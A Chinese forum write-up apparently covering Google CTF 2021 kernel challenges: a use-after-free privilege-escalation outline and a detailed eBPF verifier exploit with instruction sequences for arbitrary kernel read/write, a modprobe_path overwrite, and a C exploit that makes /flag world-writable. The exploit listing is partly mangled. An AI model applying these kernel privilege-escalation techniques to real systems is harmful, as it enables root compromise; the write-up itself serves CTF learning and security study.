> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-268566.htm)

> [原创]Google CTF 2021 Linux 内核部分题目解析

Google CTF 2021 / Linux Kernel Exploiting
=========================================

在本次比赛中，我主要做了 Linux Kernel 方向的漏洞利用，也看了一些别的题，以下是我对题目的一些总结：

*   题目 **fullchain** 是由 **chrome+mojo+kernel 三部分**构成了一个完整的链条，我个人打了 kernel 部分（很简单的 UAF），不过这种出题方式我认为很新颖。
*   题目 **COMPRESSION** 是一道涉及压缩的用户态 PWN 题。
*   题目 **ATHERIS** 是一道 Fuzz 类型的题目，**需要利用 Google 最新的 python-fuzz——[atheris](https://github.com/google/atheris/) 进行解题**。
*   题目 **MEMSAFETY** 是一道 **Rust+Sandbox** 逃逸。（不过我这边没接触过 rust，所以没有看这道题）
*   题目 **ABC ARM AND AMD** 是一道 shellcode 编写的题目，要求构造一个可见字符 shellcode，**同时可以在 aarch64 和 x86-64 下达成 orw 的效果**。

本次比赛我认为题目质量很高，都是较为新颖的题目形式 / 考点，或者偏 realword 一点的题目。

 

目录

*   Google CTF 2021 / Linux Kernel Exploiting
*   Fullchain(kernel part)
*            [Overview](#overview)
*            [利用思路](#利用思路)
*            [相关文件](#相关文件)
*   [eBPF](#ebpf)
*            [题目内容](#题目内容)
*                    [bpf_verifier.h.patch](#bpf_verifier.h.patch)
*                    [verifier.c.patch](#verifier.c.patch)
*                    [patch 流程](#patch流程)
*                    [漏洞点](#漏洞点)
*            [利用过程](#利用过程)
*                    Step 1 (构造 Vuln Type)
*                    Step 2 (Trigger the Vuln,Leak kernel base)
*                    Step 3 (Overwrite modprobe_path)
*            [exp](#exp)
*   [引用](#引用)

Fullchain(kernel part)
======================

Overview
--------

本题的文件系统不能直接调试，需要做一定修改之后才能正常启动。

 

（感谢 @Lime 当时跟我凌晨还在讨论怎么调试这个文件系统）

 

题目给出了一个 **ext4** 的文件系统的. img。

```
rootfs.img: Linux rev 1.0 ext4 filesystem data, UUID=fa0aa1fe-4545-4f4f-9d0e-aec298407b0c (needs journal recovery) (extents) (64bit) (large files) (huge files)

```

这种 rootfs.img 不能够直接使用 cpio 工具进行解压，而应该用 mount+umount 进行 unpack-->change-->pack。

 

具体如下：

```
mkdir rootfs
mount -o loop ./rootfs.img ./rootfs # mount到./rootfs目录

```

在 mount 到 ./rootfs 之后，你可以进入 ./rootfs 对文件进行修改，而我们的修改可以同步到文件系统中。

```
root@ubuntu:~/google-CTF/fullchain/fullchain/rootfs# ls
bin   ctf.ko  etc  exp.c  init  lib64       media  opt   root  run_chromium.py  srv  tmp  var
boot  dev     exp  home   lib   lost+found  mnt    proc  run   sbin             sys  usr

```

修改结束后一定要执行：

```
umount ./rootfs

```

Umount 文件系统，然后再用 qemu 启动才可以正常调试。如果不进行 umount，无法正常的启动内核。

利用思路
----

本题给了一个裸的 UAF，没有任何保护，利用非常简单，思路较为清晰。

 

思路：

1.  首先构造一个 UAF 的 slab，在内核堆上喷射 tty_struct，然后利用喷上来的 tty_struct+0x18 的指针 leak kernel base。
2.  利用 tty_struct + 0x50 处的值 leak slab addr。
3.  然后将 fake ops 放到当前的 slab 的 tty_struct 之后。
4.  劫持 ptmx 对应的 ioctl 函数为 work_for_cpu_fn。
5.  利用 `work_for_cpu_fn` 调用 `commit_creds(prepare_kernel_cred(0))` 提权即可。

相关文件
----

我个人的 exp 以及题目的 .c 文件如下：

 

**exp.c :** https://paste.ubuntu.com/p/yfPFQh2Q7w/

 

**ctf.c :** https://paste.ubuntu.com/p/f8qjBzt3HM/

eBPF
====

本题偏 **realword**，主要考察了 **Linux 内核 eBPF 虚拟机漏洞利用**，当时做了半天没做出来，最后由 @2019 师傅出了这道题，我跟着师傅的思路再做复盘。

 

传送门：[Google CTF 2021 eBPF](https://mem2019.github.io/jekyll/update/2021/07/19/GCTF2021-eBPF.html)

 

首先本题由于是需要基于 qemu 下进行爆破，所以我基于 python 编写了一个爆破脚本。

 

[script](https://paste.ubuntu.com/p/79K9rhRjgJ/)

 

**<u>Somthing useful in verifier.c's comments：</u>**

 

**eBPF 寄存器**

 

* All registers are 64-bit.

 

* R0 - return register

 

* R1-R5 argument passing registers

 

* R6-R9 callee saved registers

 

* R10 - frame pointer read-only

 

_At the start of BPF program the register R1 contains a pointer to bpf_context and has type **PTR_TO_CTX**._

 

在 eBPF 程序的一开始 R1 类型为 `PTR_TO_CTX`

 

**eBPF 寄存器类型**

 

Most of the time the registers have SCALAR_VALUE type, which means the register has some value, but it's not a valid pointer.(like pointer plus pointer becomes SCALAR_VALUE type)

 

大多数时间是 reg 是标量类型而不是指针类型。

 

PTR_TO_MAP_VALUE means that this register is pointing to 'map element value'

 

and the **range of [ptr, ptr + map's value_size) is accessible**.

 

更多有用的 comments 的可以看：https://paste.ubuntu.com/p/dHpJr3vp46/

题目内容
----

### bpf_verifier.h.patch

```
--- linux-5.12.2/include/linux/bpf_verifier.h    2021-05-07 03:53:26.000000000 -0700
+++ linux-5.12.2-modified/include/linux/bpf_verifier.h    2021-06-15 20:06:53.019787853 -0700
@@ -156,6 +156,7 @@
     enum bpf_reg_liveness live;
     /* if (!precise && SCALAR_VALUE) min/max/tnum don't affect safety */
     bool precise;
+        bool auth_map;
 };
 
 enum bpf_stack_slot_type {

```

主要是在 `struct bpf_reg_state` eBPF 寄存器结构体中 加了一个 `bool auth_map`

 

https://elixir.bootlin.com/linux/v5.12.2/source/include/linux/bpf_verifier.h#L161

### verifier.c.patch

```
--- linux-5.12.2/kernel/bpf/verifier.c    2021-05-07 03:53:26.000000000 -0700
+++ linux-5.12.2-modified/kernel/bpf/verifier.c    2021-06-15 20:06:54.495796355 -0700
@@ -2923,6 +2924,7 @@
                    int off, int size, u32 mem_size,
                    bool zero_size_allowed)
 {
+ 
     struct bpf_verifier_state *vstate = env->cur_state;
     struct bpf_func_state *state = vstate->frame[vstate->curframe];
     struct bpf_reg_state *reg = &state->regs[regno];
@@ -6326,13 +6330,19 @@
                 memset(&dst_reg->raw, 0, sizeof(dst_reg->raw));
         }
         break;
-    case BPF_AND:
-    case BPF_OR:
     case BPF_XOR:
-        /* bitwise ops on pointers are troublesome, prohibit. */
-        verbose(env, "R%d bitwise operator %s on pointer prohibited\n",
-            dst, bpf_alu_string[opcode >> 4]);
-        return -EACCES;
+                // As long as we downgrade the result to scalar it is safe.
+                if (dst_reg->type == PTR_TO_MAP_VALUE) {
+                       
  ->type = SCALAR_VALUE;
+                        dst_reg->auth_map = true;
+                        break;
+                }
+        case BPF_AND:
+    case BPF_OR:
+          /* bitwise ops on pointers are troublesome, prohibit. */
+          verbose(env, "R%d bitwise operator %s on pointer prohibited\n",
+              dst, bpf_alu_string[opcode >> 4]);
+          return -EACCES;
     default:
         /* other operators (e.g. MUL,LSH) produce non-pointer results */
         verbose(env, "R%d pointer arithmetic with %s operator prohibited\n",
@@ -7037,6 +7047,13 @@
         scalar_min_max_or(dst_reg, &src_reg);
         break;
     case BPF_XOR:
+                /* Restore the pointer type.*/
+                if (dst_reg->auth_map) {
+                         dst_reg->auth_map = false;
+                         dst_reg->type = PTR_TO_MAP_VALUE;
+                         break;
+                }
+
         dst_reg->var_off = tnum_xor(dst_reg->var_off, src_reg.var_off);
         scalar32_min_max_xor(dst_reg, &src_reg);
         scalar_min_max_xor(dst_reg, &src_reg);

```

在 `adjust_ptr_min_max_vals` 里打了 patch

 

https://elixir.bootlin.com/linux/v5.12.2/source/kernel/bpf/verifier.c#L6131

```
adjust_reg_min_max_vals()
->    adjust_ptr_min_max_vals()

```

被 patch 的函数主要用于处理：对于 **指针 与 标量** 的算术运算，并计算新的最大最小的 var_off。

 

在 **正常的** 函数中不允许指针与标量做位运算：

```
case BPF_XOR:
    /* bitwise ops on pointers are troublesome, prohibit. */
    verbose(env, "R%d bitwise operator %s on pointer prohibited\n",
        dst, bpf_alu_string[opcode >> 4]);
    return -EACCES;

```

这里会直接 `return -EACCES;`

 

并且，在 `adjust_reg_min_max_vals` 中还指出了：两个指针之间只能做减法运算。

### patch 流程

主要是在 eBPF 寄存器中加了一个 `auth_map` 变量，在处理 `adjust_ptr_min_max_vals` 时：

 

**case BPF_XOR:**

*   如果目标 `dst_reg->type == PTR_TO_MAP_VALUE` 直接设置 `dst_reg->type = SCALAR_VALUE` 为标量。然后 break。
*   如果寄存器之前设置了 `auth_map` 那么置为 false，恢复 `dst_reg->type = PTR_TO_MAP_VALUE`

### 漏洞点

对于 XOR 来说，假如我们是：

```
XOR dst_reg, src_reg

```

且 dst_reg 为 PTR_TO_MAP_VALUE 类型。

 

如果我们将 dst_reg 设置为一个地址，类型为 PTR_TO_MAP_VALUE。

 

经过测试，当这个值类型为 PTR_TO_MAP_VALUE 时，对这个指针类型的寄存器进行算术运算是有限制的（边界），eBPF-verifier 会对其进行一些 OOB 的检测，以至于在指针类型的寄存器中我们无法构造指向任意地址的指针。

 

而如果我们通过 XOR 将其降级为一个标量类型，任何的运算都是直接的算术运算而不涉及到地址，进而不会触发 verfier 在 jit 过程中的检测。

 

这样我们就可以**构造一个指向任意地址的寄存器**（当然，此时寄存器被标识为标量类型而非指针类型）。

 

通过这个指向任意地址的寄存器，我们可以就可以在此基础上构造**任意内存地址读写的原语**。

利用过程
----

### Step 1 (构造 Vuln Type)

首先我们要到达触发漏洞的地方，首先需要构造类型为 `PTR_TO_MAP_VALUE` 的寄存器。

 

**我们主要关注以下这句话：**

*   When the verifier sees a helper call return a reference type, it allocates a pointer id for the reference and stores it in the current function state.**Similar to the way that PTR_TO_MAP_VALUE_OR_NULL is converted into PTR_TO_MAP_VALUE**
    
*   .ret_type which is RET_PTR_TO_MAP_VALUE_OR_NULL, so it sets R0->type = PTR_TO_MAP_VALUE_OR_NULL which means bpf_map_lookup_elem() function returns ether pointer to map value or NULL.
    
*   **When type PTR_TO_MAP_VALUE_OR_NULL <u>passes</u> through 'if (reg != 0) goto +off'** insn, the register holding that pointer in the true branch **<u>changes state to PTR_TO_MAP_VALUE</u>** and the same register changes state to CONST_IMM in the false branch.
    

也就是说 `bpf_map_lookup_elem()` 会返回一个 `PTR_TO_MAP_VALUE_OR_NULL` 类型的 `BPF_REG_0`，如果这个`BPF_REG_0` 通过了 if 的 check，那么就会将其设置为 `PTR_TO_MAP_VALUE` 。

 

这样我们就有机会构造出多个类型为 `PTR_TO_MAP_VALUE` 的寄存器。

 

首先我们通过：`bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,0x1);`

 

创建一个 map。

> 此 map 中对应的 key 的大小为 int，value 的大小为 0x100，以及有且仅有一对 {key : value}

 

然后构造如下的 BPF insn：

```
/* 此时我们已经创建好了 expmap ，我们尝试调用 BPF_FUNC_map_lookup_elem 来构造type为 PTR_TO_MAP_VALUE 的寄存器 */
  // r1 为我们创建好的map_fd，会被转换为对应的map地址
  BPF_LD_MAP_FD(BPF_REG_1,expmapfd), 
  BPF_MOV64_IMM(BPF_REG_0, 0),
  // r2 我们需要构造成对应的Key的地址
 
  BPF_ALU64_IMM(BPF_MOV,BPF_REG_6,0),         // r6 = 0
  BPF_STX_MEM(BPF_DW,BPF_REG_10,BPF_REG_6,-8),// *(r10 - 8) = r6  ; r10作为 framepointer 这里相当于给 fp - 8 上放了个 0
  BPF_MOV64_REG(BPF_REG_7,BPF_REG_10),        // r7 = r10         ; r10是 read-only 的 ， 我们将r10的值（指向对应的栈帧的地址）赋值给 r7
  BPF_ALU64_IMM(BPF_ADD,BPF_REG_7,-8),        // r7 = r7 - 8      ; 通过写 r7 寄存器 ， 定位到我们刚刚放的那个 0 的地址
  BPF_MOV64_REG(BPF_REG_2,BPF_REG_7),         // r2 = r7          ; 将最终构造好的值赋给 r2 ，此时 r2 指向 STACK 上的地址 ， *r2 为 0  
 
  BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),    // 调用 BPF_FUNC_map_lookup_elem ， 返回值 r0 为lookup到的地址
 
  BPF_JMP_IMM(BPF_JNE,0,0,1),                 // 如果返回为0 ，说明BPF_FUNC_map_lookup_elem failed ， 直接 exit 掉   
  BPF_EXIT_INSN(),

```

使用 bpftools 调试效果如下：

```
0: (18) r1 = map[id:1]
 2: (b7) r0 = 0
 3: (b7) r6 = 0
 4: (7b) *(u64 *)(r10 -8) = r6
 5: (bf) r7 = r10
 6: (07) r7 += -8
 7: (bf) r2 = r7
 
 8: (07) r1 += 272                             # 跳过控制结构，此时 r1 指向map_entry的位置   
 9: (61) r0 = *(u32 *)(r2 + 0)    # 获取r2指向的位置的值为 key
10: (35) if r0 >= 0x1 goto pc+3 # 对 key进行check。因为我们的map只有一项，所以key不能大于等于 1
11: (67) r0 <<= 8                               
12: (0f) r0 += r1                                # 通过r0(key)+r1(ptr)索引到对应的目标地址，作为返回值。
13: (05) goto pc+1
14: (b7) r0 = 0
 
15: (95) exit

```

可以看到，从 0～7，与我们分析的差不多。

 

从 8～14 则是 `BPF_FUNC_map_lookup_elem` 具体做的操作。

 

comments 中也给出了一个简短的介绍：

```
u64 bpf_map_lookup_elem(u64 r1, u64 r2, u64 r3, u64 r4, u64 r5)
 
    {
        struct bpf_map *map = (struct bpf_map *) (unsigned long) r1;
        void *key = (void *) (unsigned long) r2;
        void *value;
 
        here kernel can access 'key' and 'map' pointers safely, knowing that
        [key, key + map->key_size) bytes are valid and were initialized on
        the stack of eBPF program.
    }

```

需要注意的是，在 BPF helper func 中，BPF 程序需要返回的是 value 的指针，而用户态发起的 bpf() 系统调用需要返回的是 value 的值。

 

当程序成功执行之后，**r0 的类型为 PTR_TO_MAP_VALUE** ，**r0 的值为成功查询到的对应的 <u> 地址 </u>**。

### Step 2 (Trigger the Vuln,Leak kernel base)

**在这一部分，我们需要利用 eBPF 虚拟机的漏洞，利用他的指令编写可以任意内存读的原语。**

 

此时我们已经有了对应类型的 r0，我们通过 mov 指令，将对应的类型与值也赋值给 r1、r2、r3 寄存器。

```
BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
  BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),
  BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),

```

然后使用 patch 后的 XOR 函数将他们的类型降级为标量，此时他们的值仍然是对应的地址。

```
BPF_ALU64_IMM(BPF_XOR, BPF_REG_2, 0),
  BPF_ALU64_IMM(BPF_XOR, BPF_REG_1, 0),

```

接下来有一个技巧，我们可以通过看 r2 的值来确定我们要准备 load addr 的 addr 应该是多少

```
BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0x21ef0+0x18),
BPF_STX_MEM(BPF_DW, BPF_REG_3,  BPF_REG_2, 0),        //本句可用于调试，因为此时r3指向map中的那一项的地址，我们将r2的内容放到r3指向的位置，最后再用lookup查找对应的key=0，即可获得此时r2的值。

```

以下这两句将 r2 的值放到了 map 中，我们通过 `bpf_lookup_elem(expmapfd,&key,&val)` 可以查询到此时 r2 的值。（方便 debug）

 

而实际情况中，在触发了两次漏洞后，没法对同一个再来 XOR 一次了，也就是说当我们将一个指针降级为标量后，无法再恢复成指针类型了。

 

于是可以采用：

```
/*  在保证r2数值不变的情况下，通过REG XOR，以BPF_REG_0 为中转，将r1设置为r2的值并且设置r1的类型为指针类型 */
BPF_ALU64_REG(BPF_XOR, BPF_REG_0, BPF_REG_2),
BPF_ALU64_REG(BPF_XOR, BPF_REG_1, BPF_REG_0),

```

恢复 r1 的指针类型。

```
BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_1, 0),
BPF_STX_MEM(BPF_DW, BPF_REG_3,  BPF_REG_2, 0),

```

然后将 r1 指向地址的值放入 r2，最后将 r2 中保存的全局变量的值放入 key=0 即可。

 

收尾：

```
//end
BPF_MOV64_IMM(BPF_REG_0, 0),               // 在非root的情况下必须加这一条，否则会直接挂掉(不知道为啥)
BPF_EXIT_INSN(),

```

整个这一段如下：

```
struct bpf_insn insns[]={
    /* 此时我们已经创建好了 expmap ，我们尝试调用 BPF_FUNC_map_lookup_elem 来构造type为 PTR_TO_MAP_VALUE 的寄存器 */
    // r1 为我们创建好的map_fd，会被转换为对应的map地址
    BPF_LD_MAP_FD(BPF_REG_1,expmapfd), 
    BPF_MOV64_IMM(BPF_REG_0, 0),
    // r2 我们需要构造成对应的Key的地址
 
    BPF_ALU64_IMM(BPF_MOV,BPF_REG_6,0),         // r6 = 0
    BPF_STX_MEM(BPF_DW,BPF_REG_10,BPF_REG_6,-8),// *(r10 - 8) = r6  ; r10作为 framepointer 这里相当于给 fp - 8 上放了个 0
    BPF_MOV64_REG(BPF_REG_7,BPF_REG_10),        // r7 = r10         ; r10是 read-only 的 ， 我们将r10的值（指向对应的栈帧的地址）赋值给 r7
    BPF_ALU64_IMM(BPF_ADD,BPF_REG_7,-8),        // r7 = r7 - 8      ; 通过写 r7 寄存器 ， 定位到我们刚刚放的那个 0 的地址
    BPF_MOV64_REG(BPF_REG_2,BPF_REG_7),         // r2 = r7          ; 将最终构造好的值赋给 r2 ，此时 r2 指向 STACK 上的地址 ， *r2 为 0  
 
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),    // 调用 BPF_FUNC_map_lookup_elem ， 返回值 r0 为lookup到的地址
 
    BPF_JMP_IMM(BPF_JNE,0,0,1),                 // 如果返回为0 ，说明BPF_FUNC_map_lookup_elem failed ， 直接 exit 掉   
    BPF_EXIT_INSN(),
 
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),       
 
    /* 接下来将 r1,r2 转换成标量，然后才能通过加上偏移构造出堆上tty_struct 的地址，进而进行读写；而如果以指针的形式直接加会越界会直接被ban掉 */
       BPF_ALU64_IMM(BPF_XOR, BPF_REG_2, 0),
        BPF_ALU64_IMM(BPF_XOR, BPF_REG_1, 0),
 
    /*  我们取到的map addr 相对内核堆上tty_struct的偏移较为固定(但还是需要爆破)  */
    // 0x136f10+0x18+0x1a4857c8             0xffff88801fb6e800 = 0x136f10+0xffff88801fa378f0
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0x21ef0+0x18),           //
 
    /*  此时以标量的形式构造出来了一个指向tty_struct的指针r2，但是不能用他直接load内存，因为这时的r2是个标量，我们要将其重新转换到指针的形式 */
    /*  在保证r2数值不变的情况下，通过REG XOR，以BPF_REG_0 为中转，将r1设置为r2的值并且设置r1的类型为指针类型 */
        BPF_ALU64_REG(BPF_XOR, BPF_REG_0, BPF_REG_2),
        BPF_ALU64_REG(BPF_XOR, BPF_REG_1, BPF_REG_0),  
      BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_1, 0),
   // 通过call_usermodehelper_setup的第一个参数找到未导出符号的modprobe_path（0xffffffff8284db40）
 
    BPF_STX_MEM(BPF_DW, BPF_REG_3,  BPF_REG_2, 0), // 储存r2中保存的tty_struct中全局变量的地址到r3（map_ptr）指向的地址的位置
    //end
    BPF_MOV64_IMM(BPF_REG_0, 0),               // 在非root的情况下必须加这一条，否则会直接挂掉(不知道为啥)
        BPF_EXIT_INSN(),
 
 
};

```

### Step 3 (Overwrite modprobe_path)

在本部分，我们需要通过 eBPF-asm 构建任意内存写的原语。

 

本题中 modprobe_path 没有导出，在这种情况下，我们可以通过先构造一个 fake_elf，然后在 `call_usermodehelper_setup` 上打断点。

 

在 call_usermodehelper_setup 函数调用的过程中，其第一个参数`$rdi` 就是没导出的全局变量 modprobe_path 的地址。这样就可以知道不开 kaslr 下 modprobe_path 相对 kernel base 的偏移了。进而计算出真正的 modprobe_path 的地址。

 

最终构造出的任意内存写的原语如下：

```
struct bpf_insn insns2[]={
       BPF_LD_MAP_FD(BPF_REG_1,expmapfd2), 
       BPF_MOV64_IMM(BPF_REG_0, 0),
       BPF_ALU64_IMM(BPF_MOV,BPF_REG_6,0),       
       BPF_STX_MEM(BPF_DW,BPF_REG_10,BPF_REG_6,-8),
       BPF_MOV64_REG(BPF_REG_7,BPF_REG_10),
       BPF_ALU64_IMM(BPF_ADD,BPF_REG_7,-8),   
       BPF_MOV64_REG(BPF_REG_2,BPF_REG_7), 
       BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),     
       BPF_JMP_IMM(BPF_JNE,0,0,1),                 
       BPF_EXIT_INSN(),                
         BPF_MOV64_REG(BPF_REG_3, BPF_REG_0), 
       BPF_ALU64_IMM(BPF_XOR, BPF_REG_3, 0),
       BPF_ALU64_IMM(BPF_XOR, BPF_REG_0, 0),
       BPF_MOV64_IMM(BPF_REG_2,0),
       BPF_MOV32_IMM(BPF_REG_2,modprobe_path_high32),
       BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),              // 18: (67) r2 <<= 32
       BPF_ALU64_IMM(BPF_OR, BPF_REG_2, modprobe_path_low32),
       // 这一步结束后r2为modprobe_path，标量
       BPF_MOV64_IMM(BPF_REG_1, 0),
       BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),
 
       BPF_ALU64_REG(BPF_XOR, BPF_REG_0, BPF_REG_1),
       BPF_ALU64_IMM(BPF_XOR, BPF_REG_0, 0),
       BPF_ALU64_REG(BPF_XOR, BPF_REG_3, BPF_REG_0),
       BPF_MOV64_IMM(BPF_REG_5, 0),
       BPF_ALU64_IMM(BPF_ADD,BPF_REG_5, overwrite),
 
       BPF_STX_MEM(BPF_DW, BPF_REG_3, BPF_REG_5, 0),
       BPF_MOV64_IMM(BPF_REG_0, 0),
       BPF_EXIT_INSN(),
 
   };

```

在写的时候我发现了一个问题，对于 modprobe_path 这块内存，如果最终

```
BPF_ALU64_IMM(BPF_OR, BPF_REG_2, modprobe_path_low32),

```

将这一句的 OR 换成 ADD，会触发到内核的内存保护。

```
[    3.485700] general protection fault, probably for non-canonical address 0xffffffe8284db40: 0000 [#1] SMP NOPTI

```

但是如果用 OR ， 则可以正常写内存。暂不知道是为什么。

 

最后执行 我们 fake 的文件即可。

 

![](https://bbs.pediy.com/upload/attach/202107/876323_BJG56CK5E3PT89C.png)

exp
---

```
#define _GNU_SOURCE
#include #include #include #include #include #include #include #include #include #include #include #include #include "bpf_insn.h"   
#define BPF_JMP32       0x06    /* jmp mode in word width */
int expmapfd;
int expmapfd2;
int progfd;
int progfd2;
int sockets[2];
#define LOG_BUF_SIZE 65535
char bpf_log_buf[LOG_BUF_SIZE]; //bpf的log信息被存储在这里
void gen_fake_elf(){
    system("echo -ne '#!/bin/sh\nid\n/bin/chmod 777 /flag\n' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\xff\xff\xff\xff' > /tmp/fake");
    system("chmod +x /tmp/fake");
}
void init(){
    setbuf(stdin,0);
    setbuf(stdout,0);
    //setbuf(stderr,0);
    gen_fake_elf();
}
void x64dump(char *buf,uint32_t num){        
    uint64_t *buf64 =  (uint64_t *)buf;      
    printf("[--dump--] start : \n");        
    for(int i=0;i>32)&0xfffffff;
    printf("modprobe_path_high32: %#llx\nmodprobe_path_low32: %#llx\n",modprobe_path_high32,modprobe_path_low32);
 
    uint64_t overwrite = 0x782f706d742f;  
    struct bpf_insn insns2[]={
        BPF_LD_MAP_FD(BPF_REG_1,expmapfd2), 
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_ALU64_IMM(BPF_MOV,BPF_REG_6,0),       
        BPF_STX_MEM(BPF_DW,BPF_REG_10,BPF_REG_6,-8),// *(r10 - 8) = r6  ; r10作为 framepointer 这里相当于给 fp - 8 上放了个 0
        BPF_MOV64_REG(BPF_REG_7,BPF_REG_10),        // r7 = r10         ; r10是 read-only 的 ， 我们将r10的值（指向对应的栈帧的地址）赋值给 r7
        BPF_ALU64_IMM(BPF_ADD,BPF_REG_7,-8),        // r7 = r7 - 8      ; 通过写 r7 寄存器 ， 定位到我们刚刚放的那个 0 的地址
        BPF_MOV64_REG(BPF_REG_2,BPF_REG_7),         // r2 = r7          ; 将最终构造好的值赋给 r2 ，此时 r2 指向 STACK 上的地址 ， *r2 为 0  
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),     
        BPF_JMP_IMM(BPF_JNE,0,0,1),                 // 如果返回为0 ，说明BPF_FUNC_map_lookup_elem failed ， 直接 exit 掉   
        BPF_EXIT_INSN(),                
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_0), 
        BPF_ALU64_IMM(BPF_XOR, BPF_REG_3, 0),
        BPF_ALU64_IMM(BPF_XOR, BPF_REG_0, 0),
        BPF_MOV64_IMM(BPF_REG_2,0),
        BPF_MOV32_IMM(BPF_REG_2,modprobe_path_high32),
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),              // 18: (67) r2 <<= 32
        BPF_ALU64_IMM(BPF_OR, BPF_REG_2, modprobe_path_low32),
        // 这一步结束后r2为modprobe_path，标量
        BPF_MOV64_IMM(BPF_REG_1, 0),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),
 
        BPF_ALU64_REG(BPF_XOR, BPF_REG_0, BPF_REG_1),
        BPF_ALU64_IMM(BPF_XOR, BPF_REG_0, 0),
        BPF_ALU64_REG(BPF_XOR, BPF_REG_3, BPF_REG_0),
        BPF_MOV64_IMM(BPF_REG_5, 0),
        BPF_ALU64_IMM(BPF_ADD,BPF_REG_5, overwrite),
 
        BPF_STX_MEM(BPF_DW, BPF_REG_3, BPF_REG_5, 0),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
 
    };
 
    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insns2, sizeof(insns2), "GPL", 0);
    puts(bpf_log_buf);
    puts(strerror(errno));
 
    if(progfd < 0){ __exit(strerror(errno));}
    printf("[+] bpf_prog_load success\n");
    if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)){
        __exit(strerror(errno));
    }
    if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0){
        __exit(strerror(errno));
    }
    writemsg();
 
    uint64_t key;
    uint64_t val[0x400];
    key = 0;
 
    assert(bpf_lookup_elem(expmapfd2,&key,&val)==0);
    printf("[+] lookup key = 0, val = %#lx\n",val[0]);
 
 
    system("/tmp/x");
    system("cat /flag");
    return;
 
}
 
int main(int argc,char **argv){
    init();
    leak();
    pwn();
    //getchar();
    return 0;
} 
```

引用
==

[linux ext4 img 解包打包教程, 解打包. img.ext4(转)](https://blog.csdn.net/weixin_39601794/article/details/116742127)

 

https://blog.csdn.net/pwl999/article/details/82884882

[[注意] 招人！base 上海，课程运营、市场多个坑位等你投递！](https://bbs.pediy.com/thread-267474.htm)

最后于 2 天前 被 ScUpax0s 编辑 ，原因：

[#内核](forum-171-1-185.htm)